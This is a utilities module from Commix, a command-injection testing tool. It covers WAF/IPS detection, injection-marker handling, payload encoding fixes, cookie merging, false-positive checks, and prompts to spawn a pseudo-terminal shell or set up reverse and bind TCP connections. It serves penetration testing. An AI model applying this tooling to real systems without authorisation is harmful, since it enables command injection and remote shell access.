#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import io
import re
import os
import sys
import json
import time
import socket
import random
import string
import base64
import gzip
import zlib
import traceback
import subprocess
from glob import glob
from src.utils import common
from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.utils import simple_http_server
from src.thirdparty.odict import OrderedDict
from src.core.convert import hexdecode
from socket import error as SocketError
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_client as _http_client
from src.thirdparty.colorama import Fore, Back, Style, init
from src.thirdparty.flatten_json.flatten_json import flatten, unflatten_list

try:
  if settings.PLATFORM == "mac":
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
    from readline import *
  else:
    import readline
    from readline import *
except:
  try:
    import pyreadline as readline
    from pyreadline import *
  except:
    settings.READLINE_ERROR = True

"""
Exiting
"""
def exit():
  if settings.VERBOSITY_LEVEL != 0:
    settings.print_data_to_stdout(settings.execution("Ending"))
  os._exit(0)

"""
Detection of WAF/IPS protection.
"""
def check_waf(url, http_request_method):
  payload = _urllib.parse.quote(settings.WAF_CHECK_PAYLOAD)
  info_msg = "Checking whether the target is protected by some kind of WAF/IPS."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  if settings.VERBOSITY_LEVEL >= 1:
    settings.print_data_to_stdout(settings.print_payload(payload))
  payload = "".join(random.sample(string.ascii_uppercase, k=4)) + "=" + payload
  if not "?" in url:
    payload = "?" + payload
  else:
    payload = settings.POST_DATA_PARAM_DELIMITER + payload
  url = url + payload
  if settings.USER_DEFINED_POST_DATA:
    request = _urllib.request.Request(remove_tags(url), remove_tags(settings.USER_DEFINED_POST_DATA).encode(), method=http_request_method)
  else:
    request = _urllib.request.Request(remove_tags(url), method=http_request_method)
  headers.do_check(request)
  return request, url

"""
Check injection technique(s) status.
"""
def injection_techniques_status():
  if settings.CLASSIC_STATE != True and \
     settings.EVAL_BASED_STATE != True and \
     settings.TIME_BASED_STATE != True and \
     settings.FILE_BASED_STATE != True and \
     settings.TEMPFILE_BASED_STATE != True :
    return False
  else:
    return True

"""
Check for quoted values
"""
def quoted_value(value):
  return '"{}"'.format(value)

"""
Payload fixation
"""
def payload_fixation(payload):

  payload = _urllib.parse.unquote(payload)
  payload = _urllib.parse.quote(payload)
  return payload

"""
Get response output
"""
def get_response(output):
  request = _urllib.request.Request(output)
  headers.do_check(request)
  headers.check_http_traffic(request)
  # Check if defined any HTTP Proxy (--proxy option).
  if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor: 
    response = proxy.use_proxy(request)
  else:
    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
  return response

"""
Check for non custom parameters.
"""
def process_non_custom():
  if settings.CUSTOM_INJECTION_MARKER and not settings.SKIP_NON_CUSTOM_PARAMS:
    while True:
      message = "Other non-custom parameters found."
      message += " Do you want to process them too? [Y/n] > "
      process = common.read_input(message, default="Y", check_batch=True)
      if process in settings.CHOICE_YES:
        settings.CUSTOM_INJECTION_MARKER = False
        settings.SKIP_NON_CUSTOM_PARAMS = settings.IGNORE_USER_DEFINED_POST_DATA = False
        return 
      elif process in settings.CHOICE_NO:
        settings.SKIP_NON_CUSTOM_PARAMS = True
        settings.IGNORE_USER_DEFINED_POST_DATA = False
        return 
      elif process in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(process)
        pass

"""
Process the defined injectable value
"""
def process_injectable_value(payload, data):
  if len(settings.TESTABLE_VALUE) == 0:
    settings.TESTABLE_VALUE = settings.SINGLE_WHITESPACE
  _ = data.replace(settings.TESTABLE_VALUE, settings.RANDOM_TAG)
  if settings.TESTABLE_VALUE in _.replace(settings.INJECT_TAG, ""):
    return _.replace(settings.INJECT_TAG, "").replace(settings.TESTABLE_VALUE, payload).replace(settings.RANDOM_TAG, settings.TESTABLE_VALUE)
  else:
    return _.replace(settings.RANDOM_TAG + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload).replace(settings.RANDOM_TAG, settings.TESTABLE_VALUE)

"""
Remove all injection tags from provided data
"""
def remove_tags(data):
  if not data:
    data = ""
  return data.replace(settings.INJECT_TAG,"").replace(settings.CUSTOM_INJECTION_MARKER_CHAR,"").replace(settings.ASTERISK_MARKER, "").replace(settings.RANDOM_TAG, "") 

"""
Process data with custom injection marker character ('*')
"""
def process_custom_injection_data(data):
  if not isinstance(data, str):
    # Safely return empty string if input is not a valid string
    return ""

  if settings.CUSTOM_INJECTION_MARKER is not None:
    lines = []
    for line in data.split("\\n"):
      if not line.startswith(settings.ACCEPT) and settings.CUSTOM_INJECTION_MARKER_CHAR in line:
        if menu.options.test_parameter is not None and settings.CUSTOM_INJECTION_MARKER is False:
          line = remove_tags(line)
        line = line.replace(settings.CUSTOM_INJECTION_MARKER_CHAR, settings.ASTERISK_MARKER)
      lines.append(line)
    
    # Remove duplicates, then rejoin lines
    data = "\\n".join(list(dict.fromkeys(lines))).rstrip("\\n")

  return data

"""
Check for custom injection marker character ('*').
"""
def custom_injection_marker_character(url, http_request_method):
  _ = settings.CUSTOM_INJECTION_MARKER = False
  settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST = []
  
  if url and settings.CUSTOM_INJECTION_MARKER_CHAR in url:
    option = "'-u'"
    _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.URL = settings.USER_DEFINED_URL_DATA = True
  if menu.options.data and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.data:
    option = str(http_request_method) + " body"
    _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.DATA = True
  if not _:
    option = "option '--header(s)/--user-agent/--referer/--cookie'"
  if menu.options.cookie and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.cookie:
    settings.CUSTOM_INJECTION_MARKER = settings.COOKIE_INJECTION = settings.INJECTION_MARKER_LOCATION.COOKIE = True
  if menu.options.agent and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.agent:
    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.USER_AGENT_INJECTION = True
  if menu.options.referer and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.referer:
    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.REFERER_INJECTION = True
  if menu.options.host and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.host:
    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.HOST_INJECTION = True
  if (menu.options.header and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.header) or \
     (menu.options.headers and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.headers):
     settings.CUSTOM_INJECTION_MARKER = True
  if settings.CUSTOM_HEADER_CHECK and settings.CUSTOM_HEADER_CHECK != settings.ACCEPT:
    if settings.CUSTOM_HEADER_CHECK not in settings.TESTABLE_PARAMETERS_LIST:
      settings.CUSTOM_INJECTION_MARKER = True
    else:
      settings.CUSTOM_HEADER_INJECTION = True
      # return False

  if settings.CUSTOM_INJECTION_MARKER:
    while True:
      message = "Custom injection marker ('" + settings.CUSTOM_INJECTION_MARKER_CHAR + "') found in " + option +". "
      message += "Do you want to process it? [Y/n] > "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        return True
      elif procced_option in settings.CHOICE_NO:
        return False
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)
        pass

"""
Logging a debug message when a specific injection technique is being skipped.
"""
def skipping_technique(technique, injection_type, state):
  if settings.VERBOSITY_LEVEL != 0 and state != True:
    debug_msg = "Skipping test the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ". "
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

"""
Skipping of further tests.
"""
def keep_testing_others(filename, url):
  if not settings.LOAD_SESSION:
    if settings.SKIP_COMMAND_INJECTIONS:
      while True:
        message = "Do you want to keep testing the others? [y/N] > "
        procced_option = common.read_input(message, default="N", check_batch=True)
        if procced_option in settings.CHOICE_YES:
          settings.SKIP_COMMAND_INJECTIONS = True
          return
        elif procced_option in settings.CHOICE_NO:
          quit(filename, url, _ = False)
        elif procced_option in settings.CHOICE_QUIT:
          raise SystemExit()
        else:
          common.invalid_option(procced_option)
          pass

"""
Skipping of further command injection tests.
"""
def skip_testing(filename, url):
  if not settings.LOAD_SESSION:
    if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO:
      _ = " testing command injection techniques"
    else:
      settings.SKIP_COMMAND_INJECTIONS = False 
      settings.SKIP_CODE_INJECTIONS = True
      _ = " further testing"
    while True:
      message = "Do you want to skip" + _ + " on the " + settings.CHECKING_PARAMETER + "? [Y/n] > "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        settings.SKIP_COMMAND_INJECTIONS = True
        settings.LOAD_SESSION = False
        return
      elif procced_option in settings.CHOICE_NO:
        settings.SKIP_COMMAND_INJECTIONS = False
        return
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)
        pass

"""
Prompt the user to select a mobile User-Agent string.
"""
def mobile_user_agents():
  menu.mobile_user_agents()

  # Load the mobile user-agent list from file
  mobile_agents = common.load_list_from_file(settings.MOBILE_USER_AGENT_LIST, "mobile user-agent list")

  while True:
    message = "Which smartphone do you want to imitate through HTTP User-Agent header? > "
    mobile_user_agent = common.read_input(message, default="1", check_batch=True)
    try:
      choice = int(mobile_user_agent)
      if choice in range(1, len(mobile_agents) + 1):
        return mobile_agents[choice - 1]
      else:
        common.invalid_option(mobile_user_agent)
    except ValueError:
      if mobile_user_agent.lower() == "q":
        raise SystemExit()
      else:
        common.invalid_option(mobile_user_agent)


"""
Run host OS command(s) when injection point is found.
"""
def alert():
  if settings.ALERT:
    info_msg = "Executing alerting shell command(s) '" + str(menu.options.alert) + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    try:
      process = subprocess.Popen(menu.options.alert, shell=True)
      process.wait()
    except Exception as e:
      err_msg = "Error occurred while executing command(s) '" + str(menu.options.alert) + "'."
      settings.print_data_to_stdout(settings.print_error_msg(err_msg))

"""
Check for HTTP Method
"""
def check_http_method(url):
  if settings.CRAWLING:
    http_request_method = settings.HTTPMETHOD.GET
  elif menu.options.method:
    http_request_method = menu.options.method.upper()
  elif isinstance(url, str) and settings.INJECT_TAG in url:
    http_request_method = settings.HTTPMETHOD.GET
  else:
    if settings.COOKIE_INJECTION:
      http_request_method = settings.COOKIE
    if settings.USER_DEFINED_POST_DATA:
      http_request_method = settings.HTTPMETHOD.POST
    else:
      http_request_method = settings.HTTPMETHOD.GET
  return http_request_method

"""
Quit
"""
def quit(filename, url, _):
  if settings.LOAD_SESSION:
    logs.logs_notification(filename)
  logs.print_logs_notification(filename, url)
  common.show_http_error_codes()
  if _:
    raise exit()
  else:
    raise SystemExit()

"""
User aborted procedure
"""
def user_aborted(filename, url):
  abort_msg = "User aborted procedure "
  abort_msg += "during the " + assessment_phase()
  abort_msg += " phase (Ctrl-C was pressed)."
  settings.print_data_to_stdout(settings.print_abort_msg(abort_msg))
  raise exit()

"""
Connection exceptions
"""
def connection_exceptions(err_msg):
  requests.request_failed(err_msg)
  settings.TOTAL_OF_REQUESTS = settings.TOTAL_OF_REQUESTS + 1
  if settings.MAX_RETRIES > 1:
    time.sleep(settings.DELAY_RETRY)
    if not any((settings.MULTI_TARGETS, settings.CRAWLING,settings.REVERSE_TCP,settings.BIND_TCP)):
      warn_msg = settings.APPLICATION.capitalize() + " is going to retry the request(s)."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  if not settings.VALID_URL :
    if settings.TOTAL_OF_REQUESTS == settings.MAX_RETRIES and not settings.MULTI_TARGETS:
      raise SystemExit()

"""
Handle server-set cookies.
"""
def handle_server_cookies(response):

  """
  Mask the middle part of long cookie values to avoid leaking sensitive data in prompts.
  """
  def mask_cookie_value(cookie_str):
      return re.sub(
          r"(=[^=;]{10}[^=;])[^=;]+([^=;]{10})",
          r"\g<1>...\g<2>",
          cookie_str
      )

  try:
    set_cookie_header = []
    declared_cookies = set(menu.options.cookie.split(settings.COOKIE_PARAM_DELIMITER)) if menu.options.cookie else set()
    added_cookies = set()
    for header, value in response.getheaders():
      if header.lower() == settings.SET_COOKIE.lower():
        _ = re.search(r'^\s*([^=;\s]+=[^;]*)', value)
        if _:
          name_value = _.group(1)
          cookie_name = name_value.split("=")[0]
          if cookie_name not in declared_cookies and cookie_name not in added_cookies:
            set_cookie_header.append(name_value)
            added_cookies.add(cookie_name)

    candidate = settings.COOKIE_PARAM_DELIMITER.join(str(value) for value in set_cookie_header)

    if candidate and settings.DECLARED_COOKIES is not False and settings.CRAWLING is False:
      settings.DECLARED_COOKIES = True
      if settings.CRAWLED_SKIPPED_URLS_NUM != 0:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      if menu.options.cookie:
        user_cookies_set = set([c.split('=')[0] for c in menu.options.cookie.split(settings.COOKIE_PARAM_DELIMITER)]) 
        # intersect_cookies = user_cookies_set.intersection(added_cookies)
        if user_cookies_set:
          while True:
            message = "You declared some cookie(s), "
            message += "but the server is setting additional ones ('"
            message += mask_cookie_value(candidate)
            message += "'). Do you want to merge them? [Y/n] > "
            merge_option = common.read_input(message, default="Y", check_batch=True)
            if merge_option in settings.CHOICE_YES:
              menu.options.cookie += settings.COOKIE_PARAM_DELIMITER + candidate
              break
            elif merge_option in settings.CHOICE_NO:
              break
            elif merge_option in settings.CHOICE_QUIT:
              raise SystemExit()
            else:
              common.invalid_option(merge_option)
              pass
        else:
          menu.options.cookie += settings.COOKIE_PARAM_DELIMITER + candidate
        settings.DECLARED_COOKIES = False
      else:
        while True:
          message = "You have not declared any cookie(s), "
          message += "but the server wants to set its own ('"
          message += mask_cookie_value(candidate)
          message += "'). Do you want to use those? [Y/n] > "
          set_cookies = common.read_input(message, default="Y", check_batch=True)
          if set_cookies in settings.CHOICE_YES:
            menu.options.cookie = candidate
            break
          elif set_cookies in settings.CHOICE_NO:
            settings.DECLARED_COOKIES = False
            break
          elif set_cookies in settings.CHOICE_QUIT:
            raise SystemExit()
          else:
            common.invalid_option(set_cookies)
            pass
  except (AttributeError, KeyError, TypeError):
    pass

"""
Tab Autocompleter
"""
def tab_autocompleter():
  try:
    # MacOSX tab compliter
    if 'libedit' in readline.__doc__:
      readline.parse_and_bind("bind ^I rl_complete")
    else:
      readline.parse_and_bind("tab: complete")
    # Tab compliter
    readline.set_completer(menu.tab_completer)
  except (TypeError, AttributeError) as e:
    error_msg = "Failed to initialize tab completion with the platform's readline library."
    settings.print_data_to_stdout(settings.print_error_msg(error_msg))

"""
Load commands from history.
"""
def load_cmd_history():
  try:
    cli_history = os.path.join(os.path.expanduser("~"), settings.CLI_HISTORY)
    if os.path.exists(cli_history):
      readline.read_history_file(cli_history)
  except (IOError, AttributeError, UnicodeError) as e:
    warn_msg = "There was a problem loading the history file '" + cli_history + "'."
    if settings.IS_WINDOWS:
      warn_msg += " More info can be found at 'https://github.com/pyreadline/pyreadline/issues/30'"
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Save command history.
"""
def save_cmd_history():
  try:
    cli_history = os.path.join(os.path.expanduser("~"), settings.CLI_HISTORY)
    if os.path.exists(cli_history):
      readline.set_history_length(settings.MAX_HISTORY_LENGTH)
      readline.write_history_file(cli_history)
  except (IOError, AttributeError) as e:
    warn_msg = "Unable to write the history file '" + cli_history + "'."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Testing technique (title)
"""
def testing_technique_title(injection_type, technique):
  if settings.VERBOSITY_LEVEL != 0:
    info_msg = "Testing the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ". "
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Injection process (percent)
"""
def injection_process(injection_type, technique, percent):
  if settings.VERBOSITY_LEVEL == 0:
    info_msg = "Testing the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + "." + "" + percent + ""
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
    

"""
Percentage calculation
"""
def percentage_calculation(i, total):
  percent = ((i*100)/total)
  float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
  return percent, float_percent

"""
Print percentage calculation
"""
def print_percentage(float_percent, no_result, shell):
  if float(float_percent) == 100:
    if no_result:
      percent = settings.FAIL_STATUS
    else:
      percent = ".. (" + str(float_percent) + "%)"
  elif shell:
    percent = settings.info_msg
  else:
    percent = ".. (" + str(float_percent) + "%)"
  return percent

"""
Get value inside boundaries.
"""
def get_value_value_inside_boundaries(value):
  try:
    value = re.search(settings.VALUE_BOUNDARIES, value).group(1)
  except Exception as e:
    pass
  return value

"""
Check value inside boundaries.
"""
def value_inside_boundaries(parameter, http_request_method):
  try:
    if isinstance(parameter, str):
      value_inside_boundaries = re.search(r"=" + settings.VALUE_BOUNDARIES, parameter).group()
      if value_inside_boundaries:
        pcre_mod_value = value_inside_boundaries + settings.PCRE_MODIFIER[1:2]
        if pcre_mod_value not in parameter:
          while True:
            message = "It appears that provided value '" + value_inside_boundaries + "' has boundaries."
            message += " Do you want to add the PCRE '" + settings.PCRE_MODIFIER + "'"
            message += " modifier outside boundaries? ('" + pcre_mod_value + "') [Y/n] > "
            modifier_check = common.read_input(message, default="Y", check_batch=True)
            if modifier_check in settings.CHOICE_YES:
              parameter = parameter.replace(value_inside_boundaries, pcre_mod_value)
              break
            elif modifier_check in settings.CHOICE_NO:
              break
            elif modifier_check in settings.CHOICE_QUIT:
              raise SystemExit()
            else:
              common.invalid_option(modifier_check)
              pass

        value = re.search(settings.VALUE_BOUNDARIES, value_inside_boundaries).group(1)
        if value:
          value = value_inside_boundaries.replace(value, value + settings.CUSTOM_INJECTION_MARKER_CHAR)
          while True:
            message = "Do you want to inject the provided value '" + value + "' inside boundaries?"
            message += " ('" + value + "') [Y/n] > "
            procced_option = common.read_input(message, default="Y", check_batch=True)
            if procced_option in settings.CHOICE_YES:
              settings.INJECT_INSIDE_BOUNDARIES = True
              parameter = parameter.replace(value_inside_boundaries, value)
              break
            elif procced_option in settings.CHOICE_NO:
              settings.INJECT_INSIDE_BOUNDARIES = False
              break
            elif procced_option in settings.CHOICE_QUIT:
              raise SystemExit()
            else:
              common.invalid_option(procced_option)
              pass
  except Exception as e:
    pass

  return parameter

"""
Ignoring the anti-CSRF parameter(s).
"""
def ignore_anticsrf_parameter(parameter):
  if any(parameter.lower().count(token) for token in settings.CSRF_TOKEN_PARAMETER_INFIXES):
    if not any(parameter for token in settings.TESTABLE_PARAMETERS_LIST):
      if (len(parameter.split("="))) == 2:
        info_msg = "Ignoring the parameter '" + parameter.split("=")[0]
        info_msg += "' that appears to hold anti-CSRF token '" + parameter.split("=")[1] +  "'."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      return True

"""
Ignoring the Google analytics cookie parameter.
"""
def ignore_google_analytics_cookie(cookie):
  if cookie.upper().startswith(settings.GOOGLE_ANALYTICS_COOKIE_PREFIX):
    if (len(cookie.split("="))) == 2:
      info_msg = "Ignoring the Google analytics cookie parameter '" + cookie.split("=")[0] + "'."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    return True

"""
Payload new line fixation
"""
def payload_newline_fixation(payload):
  # New line fixation
  if any([settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION, settings.HOST_INJECTION, settings.CUSTOM_HEADER_INJECTION]):
    payload = payload.replace("\n",";")
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")
  return payload


"""
Fix for %0a, %0d%0a separators
"""
def newline_fixation(payload):
  payload = _urllib.parse.unquote(payload)
  if settings.END_LINE.CR in payload:
    #_ = payload.find("\r\n") + 1
    #payload = _urllib.parse.quote(payload[:_]) + payload[_:]
    payload = payload.replace(settings.END_LINE.CR,"%0d")
  if settings.END_LINE.LF in payload:
    #_ = payload.find("\n") + 1
    #payload = _urllib.parse.quote(payload[:_]) + payload[_:]
    payload = payload.replace(settings.END_LINE.LF,"%0a")
  return payload


"""
Page enc/decoding
"""
def page_encoding(response, action):
  try:
    page = response.read()
  except _http_client.IncompleteRead as err_msg:
    requests.request_failed(err_msg)
    page = err_msg.partial
  if response.info().get('Content-Encoding') in ("gzip", "x-gzip", "deflate"):
    try:
      if response.info().get('Content-Encoding') == 'deflate':
        data = io.BytesIO(zlib.decompress(page, -15))
      elif response.info().get('Content-Encoding') == 'gzip' or \
           response.info().get('Content-Encoding') == 'x-gzip':
        data = gzip.GzipFile("", "rb", 9, io.BytesIO(page))
      page = data.read()
      settings.PAGE_COMPRESSION = True
    except Exception as e:
      if settings.PAGE_COMPRESSION is None:
        warn_msg = "Turning off page compression."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
        settings.PAGE_COMPRESSION = False
  _ = False
  try:
    if action == "encode" and type(page) == str:
      return page.encode(settings.DEFAULT_CODEC, errors="replace")
    else:
      return page.decode(settings.DEFAULT_CODEC, errors="replace")
  except (UnicodeEncodeError, UnicodeDecodeError) as err:
    err_msg = "The " + str(err).split(":")[0] + ". "
    _ = True
  except (LookupError, TypeError) as err:
    err_msg = "The '" + settings.DEFAULT_CODEC + "' is " + str(err).split(":")[0] + ". "
    _ = True
    pass
  if _:
    err_msg += "You are advised to rerun with"
    err_msg += ('out', '')[menu.options.codec == None] + " option '--codec'."
    settings.print_data_to_stdout(settings.print_critical_msg(str(err_msg)))
    raise SystemExit()

"""
Returns header value ignoring the letter case
"""
def get_header(headers, key):
  value = None
  for _ in (headers or {}):
    if _.upper() == key.upper():
      value = headers[_]
      break
  return value

"""
Checks regarding a recognition of generic "your ip has been blocked" messages.
"""
def blocked_ip(page):
  if re.search(settings.BLOCKED_IP_REGEX, page):
    warn_msg = "It appears that you have been blocked by the target server."
    settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

"""
Checks regarding a potential browser verification protection mechanism.
"""
def browser_verification(page):
  if not settings.BROWSER_VERIFICATION and re.search(r"(?i)browser.?verification", page or ""):
    settings.BROWSER_VERIFICATION = True
    warn_msg = "Potential browser verification protection mechanism detected"
    if re.search(r"(?i)CloudFlare", page):
      warn_msg += " (CloudFlare)."
    else:
      warn_msg += "."
    settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

"""
Checks regarding a potential CAPTCHA protection mechanism.
"""
def captcha_check(page):
  if not settings.CAPTCHA_DETECED and re.search(r"(?i)captcha", page or ""):
    for match in re.finditer(r"(?si)<form.+?</form>", page):
      if re.search(r"(?i)captcha", match.group(0)):
        settings.CAPTCHA_DETECED = True
        warn_msg = "Potential CAPTCHA protection mechanism detected"
        if re.search(r"(?i)<title>[^<]*CloudFlare", page):
          warn_msg += " (CloudFlare)."
        else:
          warn_msg += "."
        if settings.CRAWLING:
          settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
        settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
        break

"""
Checking the reliability of the used payload message.
"""
def check_for_false_positive_result(false_positive_warning):
  info_msg = "Checking if the injection point on "
  info_msg += settings.CHECKING_PARAMETER + " is a false positive.\n"
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
  warn_msg = "Time-based comparison requires " + ('larger', 'reset of')[false_positive_warning] + " statistical model"
  if settings.VERBOSITY_LEVEL != 0:
    warn_msg = warn_msg + ".\n"
  else:
    warn_msg = warn_msg +", please wait..."
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))

"""
False positive or unexploitable injection point detected.
"""
def unexploitable_point():
  if settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  warn_msg = "False positive or unexploitable injection point has been detected."
  settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

"""
Counting the total of HTTP(S) requests for the identified injection point(s), during the detection phase.
"""
def total_of_requests():
  debug_msg = "Identified the following injection point with "
  debug_msg += "a total of " + str(settings.TOTAL_OF_REQUESTS) + " HTTP(S) requests."
  settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))

"""
Url decode specific chars of the provided payload.
"""
def url_decode(payload):
  rep = {
          "%20": " ",
          "%2B": "+",
          "\n": "\\n"
        }
  rep = dict((re.escape(k), v) for k, v in rep.items())
  pattern = re.compile("|".join(rep.keys()))
  payload = pattern.sub(lambda m: rep[re.escape(m.group(0))], payload)
  return payload

"""
Check current assessment phase.
"""
def assessment_phase():
  if settings.DETECTION_PHASE:
    if settings.CRAWLING_PHASE:
      return "crawling"
    else:
      return "detection"
  else:
    return "exploitation"

"""
Procced to the next attack vector.
"""
def next_attack_vector(technique, go_back):
  if not settings.LOAD_SESSION:
    while True:
      message = "Do you want to continue testing using the " + technique + "? [y/N] > "
      next_attack_vector = common.read_input(message, default="N", check_batch=True)
      if next_attack_vector in settings.CHOICE_YES:
        # Check injection state
        assessment_phase()
        return True
      elif next_attack_vector in settings.CHOICE_NO:
        return  False
      elif next_attack_vector in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(next_attack_vector)
        pass

"""
Fix single / double quote escaping.
"""
def escaped_cmd(cmd):
  if "\\\"" in cmd :
    cmd = cmd.replace("\\\"","\"")
  if "\'" in cmd :
    cmd = cmd.replace("\'","'")
  if r"\$" in cmd :
    cmd = cmd.replace(r"\$","$")
  return cmd

"""
Removing the first and/or last line of the html content (in case there are/is empty).
"""
def remove_empty_lines(content):
  try:
    if content[0] == "\n":
      content = content[1:content.rfind("\n")]
    if content[-1] == "\n":
      content = content[:content.rfind("\n")]
  except IndexError:
    pass
  return content

"""
Enable pseudo-terminal shell
"""
def enable_shell(url):
  message = ""
  if settings.LOAD_SESSION:
    message = "Resumed "
  message += settings.CHECKING_PARAMETER
  if settings.LOAD_SESSION: 
    message += " injection point from stored session"
  else:
    message += " is likely vulnerable"
  message += ". Do you want to spawn a pseudo-terminal shell? [Y/n] > "
  if settings.CRAWLING:
    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
  if not settings.STDIN_PARSING:
    gotshell = common.read_input(message, default="Y", check_batch=True)
  else:
    gotshell = common.read_input(message, default="n", check_batch=True)
  return gotshell

"""
Check 'os_shell' options
"""
def check_os_shell_options(cmd, technique, go_back, no_result):
  if cmd in settings.SHELL_OPTIONS:
    if cmd == "?":
      menu.os_shell_options()
    elif cmd == "back":
      if next_attack_vector(technique, go_back) == True:
        return True
      else:
        return False
    else:
      return cmd

"""
Procced with file-based semiblind command injection technique,
once the user provides the path of web server's root directory.
"""
def procced_with_file_based_technique():
  while True:
    message = "Due to the provided '--web-root' option, "
    message += "do you want to proceed with the (semi-blind) "
    message += "file-based injection technique? [y/N] > "
    enable_fb = common.read_input(message, default="N", check_batch=True)
    if enable_fb in settings.CHOICE_YES:
      return True
    elif enable_fb in settings.CHOICE_NO:
      return False
    elif enable_fb in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(enable_fb)
      pass

"""
Check 'reverse_tcp' options
"""
def check_reverse_tcp_options(reverse_tcp_option):
  if reverse_tcp_option == False:
    return 0
  elif reverse_tcp_option == "back":
    return 1
  elif reverse_tcp_option == "os_shell":
    return 2
  elif reverse_tcp_option == "bind_tcp":
    return 3

"""
Check 'bind_tcp' options
"""
def check_bind_tcp_options(bind_tcp_option):
  if bind_tcp_option == False:
    return 0
  elif bind_tcp_option == "back":
    return 1
  elif bind_tcp_option == "os_shell":
    return 2
  elif bind_tcp_option == "reverse_tcp":
    return 3

"""
Ignore error messages and continue the tests.
"""
def continue_tests(err):
  # Ignoring (problematic) HTTP error codes.
  if len(settings.IGNORE_CODE) != 0 and any(str(x) in str(err).lower() for x in settings.IGNORE_CODE):
    return True

  # Possible WAF/IPS
  try:
    if (str(err.code) == settings.FORBIDDEN_ERROR or \
       str(err.code) == settings.NOT_ACCEPTABLE_ERROR) and \
       not menu.options.skip_waf and \
       not settings.HOST_INJECTION :
      warn_msg = "It seems the target is protected by some kind of WAF/IPS."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      settings.WAF_ENABLED = True

    message = ""
    if str(err.code) == settings.NOT_FOUND_ERROR:
      message = "Continuing in such cases is not recommended. "
    
    while True:
      message += "Do you want to ignore HTTP response code '" + str(err.code)
      message += "' and proceed with testing? [y/N] > "
      continue_tests = common.read_input(message, default="N", check_batch=True)
      if continue_tests in settings.CHOICE_YES:
        settings.IGNORE_CODE.append(err.code)
        return True
      elif continue_tests in settings.CHOICE_NO:
        info_msg = "Skipping further testing on the target URL."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        return False
      elif continue_tests in settings.CHOICE_QUIT:
        return False
      else:
        common.invalid_option(continue_tests)
        pass
  except AttributeError:
    pass
  except KeyboardInterrupt:
    raise

"""
Check if option is unavailable
"""
def unavailable_option(check_option):
  warn_msg = "The option '" + check_option + "' "
  warn_msg += "is currently not supported on Windows targets."
